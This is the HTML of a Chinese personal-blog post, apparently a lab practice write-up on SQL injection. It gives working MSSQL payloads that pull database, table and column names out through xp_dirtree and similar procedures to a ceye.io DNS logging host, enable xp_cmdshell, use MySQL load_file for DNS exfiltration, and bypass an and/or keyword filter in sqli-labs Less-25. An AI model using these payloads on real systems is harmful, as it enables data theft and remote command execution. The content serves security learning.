@@ -1,0 +1,1171 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="han个人博客">
+    <title>practice14 - han个人博客</title>
+    <meta name="author" content="han">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 利用mssql 数据库的 dnslog 外带数据的方式进行注入，查询出库名表名；利用 mysql 数据库在 windows 系统中 dnslog 外带数据进行注入。\n\n\n\n\n\n\nMssql 的 dnslog 外带数据注入查询库名查总个数\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select count(name) from master.dbo.sysdatabases );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n查第一个库名\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=1 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n查询第二个库名\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=2 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n全部库名如下图所示：\n\n八个库分别为：master，tempdb，model，msdb，ReportServer，aspcms，ReportServerTempDB 和 test。\n查询库 test 中的表名先查看个数\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select count(Name) FROM test.dbo.SysObjects Where XType=&apos;U&apos; );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n总共四个表\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos;);exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (&apos;emails&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n关于如何取下一个表名，还有一种更巧妙的方法，\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (select top 3 name from test.dbo.SysObjects Where XType=&apos;U&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n可知，这四个表分别为：emails，users，uagents 和 referers。\n查询 users 表中的列名1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n依次执行下面命令，可以查的所有的列名\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)\n\n列名分别为 ：id，username 和 password。\n\n使用 xp_subdirs1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_subdirs &quot;//&apos; %2b @a %2b &apos;.subdirs.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n使用 xp_fileexist1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_fileexist &quot;//&apos; %2b @a %2b &apos;.fileexist.9rq9q9.ceye.io/a&quot; &apos;)\n\n\n\n使用 xp_cmdshell现在数据库中打开 xp_cmdshell\n1234EXEC sp_configure &apos;show advanced options&apos;,1RECONFIGUREEXEC sp_configure &apos;xp_cmdshell&apos;,1RECONFIGURE\n\n\n先在数据库中执行下面命令，看是否正确。\n12345declare @a varchar(1024);set @a=&apos;www.baidu.com&apos;;exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; + @a + &apos;.cmdshell.9rq9q9.ceye.io&quot; &apos;)\n\n我们可以看到执行的结果。\n\n\n在 Hackbar执行命令\n1http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;; exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.hackbarcmd.9rq9q9.ceye.io&quot; &apos;)\n\n\n\n1http://192.168.179.131/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)\n\n\n\nMySQL 的 dnslog 外带数据注入window下在 phpstudy_pro 中 C:\\phpstudy_pro\\Extensions\\MySQL8.0.12 下的 my.ini中添加：\nsecure_file_priv= 重启服务。\n\n查询库名1select load_file(CONCAT(&apos;\\\\\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\\\abc&apos;))\n\n\n1select load_file(CONCAT(&apos;\\\\\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 1,1), &apos;.mysql.9rq9q9.ceye.io\\\\abc&apos;))\n\n\n查询 security 库中的表名1select load_file(CONCAT(&apos;\\\\\\\\&apos;,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\\\abc&apos;))\n\n\n注：也可以使用 database() 函数代替 security，不过要记住要先使用命令 use security; 否则会因当前没有使用的数据库造成失败。\n查询 emails 表中列名1select load_file(CONCAT(&apos;\\\\\\\\&apos;,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; and table_name = &apos;emails&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\\\abc&apos;))\n\n\nsqli-labs Less-251http://192.168.43.204/sqli-labs/Less-25?id=1\n\n\n1http://192.168.43.204/sqli-labs/Less-25?id=1&apos;\n\n\n1http://192.168.43.204/sqli-labs/Less-25?id=1&apos; -- |\n\n\n1http://192.168.43.204/sqli-labs/Less-25?id=1&apos; and &apos;1&apos;=&apos;1 -- |\n\n\n发现页面变化了，并且把我们输入的 and 和 or给过滤掉了。改变单词内某些字母的大小写，依然无济于事。尝试用 &amp;&amp; 和 ||。\n1http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || &apos;1&apos;=&apos;1 -- |\n\n\n可以在网页上清除看到，|| 并没有被过滤掉。\n这里可以选择联合查询\n\n由于数据库错误会提示报错信息，所以也可以选择报错注入。在这里我们通过 &amp;&amp; 和||注入。\n 1http://192.168.43.204/sqli-labs/Less-25?id=1&apos; &amp;&amp; updatexml(1, concat(&apos;~&apos;,(select database()), &apos;~&apos;), 1)  -- |\n\n\n可以发现 &amp;&amp; 及其后面的内容全部过滤掉了。\n尝试使用 ||\n\n1http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |\n\n\n发现把 information_schema 中的 or 给过滤掉了，尝试下 infoorrmation_schema\n1http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |\n\n\n同理我们也可以查到列名。\n\n","dateCreated":"2019-09-04T18:48:00+08:00","dateModified":"2019-09-05T19:27:46+08:00","datePublished":"2019-09-04T18:48:00+08:00","description":"Abstract: 利用mssql 数据库的 dnslog 外带数据的方式进行注入，查询出库名表名；利用 mysql 数据库在 windows 系统中 dnslog 外带数据进行注入。","headline":"practice14","image":["https://images.unsplash.com/photo-1501084291732-13b1ba8f0ebc?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1048&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/04/practice14/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/04/practice14/","keywords":"Access 注入 - Mssql 注入, dnslog","thumbnailUrl":"https://images.unsplash.com/photo-1501084291732-13b1ba8f0ebc?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1048&q=80"}</script>
+    <meta name="description" content="Abstract: 利用mssql 数据库的 dnslog 外带数据的方式进行注入，查询出库名表名；利用 mysql 数据库在 windows 系统中 dnslog 外带数据进行注入。">
+<meta name="keywords" content="Access 注入 - Mssql 注入,dnslog">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="practice14">
+<meta property="og:url" content="http://yoursite.com/2019/09/04/practice14/index.html">
+<meta property="og:site_name" content="han个人博客">
+<meta property="og:description" content="Abstract: 利用mssql 数据库的 dnslog 外带数据的方式进行注入，查询出库名表名；利用 mysql 数据库在 windows 系统中 dnslog 外带数据进行注入。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog10.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog11.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog12.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog13.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog15.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog14.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog16.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog8.png">
+<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C193dnslog9.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog2.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog3.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog4.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog5.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog6.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog7.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog17.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog18.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog19.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog20.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog21.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog23.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog22.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog24.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog45.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog46.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog47.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog48.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog25.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog26.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog49.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog27.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog28.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog43.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog44.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog30.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog31.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog32.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog33.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog35.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog36.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog38.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog39.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog40.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog41.png">
+<meta property="og:image" content="http://yoursite.com/images/193dnslog42.png">
+<meta property="og:updated_time" content="2019-09-05T11:27:46.597Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="practice14">
+<meta name="twitter:description" content="Abstract: 利用mssql 数据库的 dnslog 外带数据的方式进行注入，查询出库名表名；利用 mysql 数据库在 windows 系统中 dnslog 外带数据进行注入。">
+<meta name="twitter:image" content="http://yoursite.com/images/193dnslog10.png">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
+    
+    
+        <meta property="og:image" content="https://images.unsplash.com/photo-1501084291732-13b1ba8f0ebc?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1048&amp;q=80"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1501084291732-13b1ba8f0ebc?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1048&amp;q=80"/>
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-apbcs1por3ly2xr25bjnwqewpfn9wrdfbucv3jdunxv2vrrgeivtgtwgojwn.min.css">
+    <!--STYLES END-->
+    
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            han个人博客
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">han</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>life and code</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="Categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="Tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="Archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="Search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="About"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/" target="_blank" rel="noopener" title="GitHub">
+                    
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://stackoverflow.com/users" target="_blank" rel="noopener" title="Stack Overflow">
+                    
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/mailto"
+                            title="Mail"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            practice14
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2019-09-04T18:48:00+08:00">
+	
+		    Sep 04, 2019
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Web-Security/">Web Security</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p><strong>Abstract</strong>: 利用<code>mssql</code> 数据库的 <code>dnslog</code> 外带数据的方式进行注入，查询出库名表名；利用 <code>mysql</code> 数据库在 <code>windows</code> 系统中 <code>dnslog</code> 外带数据进行注入。</p>
+<a id="more"></a>
+
+<!--export-->
+
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mssql-的-dnslog-外带数据注入"><span class="toc-text">Mssql 的 dnslog 外带数据注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询库名"><span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询库-test-中的表名"><span class="toc-text">查询库 test 中的表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询-users-表中的列名"><span class="toc-text">查询 users 表中的列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用-xp-subdirs"><span class="toc-text">使用 xp_subdirs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用-xp-fileexist"><span class="toc-text">使用 xp_fileexist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用-xp-cmdshell"><span class="toc-text">使用 xp_cmdshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-的-dnslog-外带数据注入"><span class="toc-text">MySQL 的 dnslog 外带数据注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询库名-1"><span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询-security-库中的表名"><span class="toc-text">查询 security 库中的表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询-emails-表中列名"><span class="toc-text">查询 emails 表中列名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-Less-25"><span class="toc-text">sqli-labs Less-25</span></a></li></ol>
+
+<h3 id="Mssql-的-dnslog-外带数据注入"><a href="#Mssql-的-dnslog-外带数据注入" class="headerlink" title="Mssql 的 dnslog 外带数据注入"></a><code>Mssql</code> 的 <code>dnslog</code> 外带数据注入</h3><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><p>查总个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select count(name) from master.dbo.sysdatabases );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog10.png" alt></p>
+<p><img src="/images/193dnslog11.png" alt></p>
+<p>查第一个库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=1 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog12.png" alt></p>
+<p><img src="/images/193dnslog13.png" alt></p>
+<p>查询第二个库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=2 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog15.png" alt></p>
+<p><img src="/images/193dnslog14.png" alt></p>
+<p>全部库名如下图所示：</p>
+<p><img src="/images/193dnslog16.png" alt></p>
+<p>八个库分别为：<code>master</code>，<code>tempdb</code>，<code>model</code>，<code>msdb</code>，<code>ReportServer</code>，<code>aspcms</code>，<code>ReportServerTempDB</code> 和 <code>test</code>。</p>
+<h4 id="查询库-test-中的表名"><a href="#查询库-test-中的表名" class="headerlink" title="查询库 test 中的表名"></a>查询库 <code>test</code> 中的表名</h4><p>先查看个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select count(Name) FROM test.dbo.SysObjects Where XType=&apos;U&apos; );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog8.png" alt></p>
+<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C193dnslog9.png" alt></p>
+<p>总共四个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos;);exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog2.png" alt></p>
+<p><img src="/images/193dnslog3.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (&apos;emails&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog4.png" alt></p>
+<p><img src="/images/193dnslog5.png" alt></p>
+<p>关于如何取下一个表名，还有一种更巧妙的方法，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (select top 3 name from test.dbo.SysObjects Where XType=&apos;U&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog6.png" alt></p>
+<p><img src="/images/193dnslog7.png" alt></p>
+<p>可知，这四个表分别为：<code>emails</code>，<code>users</code>，<code>uagents</code> 和 <code>referers</code>。</p>
+<h4 id="查询-users-表中的列名"><a href="#查询-users-表中的列名" class="headerlink" title="查询 users 表中的列名"></a>查询 <code>users</code> 表中的列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog17.png" alt></p>
+<p><img src="/images/193dnslog18.png" alt></p>
+<p>依次执行下面命令，可以查的所有的列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p>列名分别为 ：<code>id</code>，<code>username</code> 和 <code>password</code>。</p>
+<p><img src="/images/193dnslog19.png" alt></p>
+<h4 id="使用-xp-subdirs"><a href="#使用-xp-subdirs" class="headerlink" title="使用 xp_subdirs"></a>使用 <code>xp_subdirs</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_subdirs &quot;//&apos; %2b @a %2b &apos;.subdirs.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog20.png" alt></p>
+<p><img src="/images/193dnslog21.png" alt></p>
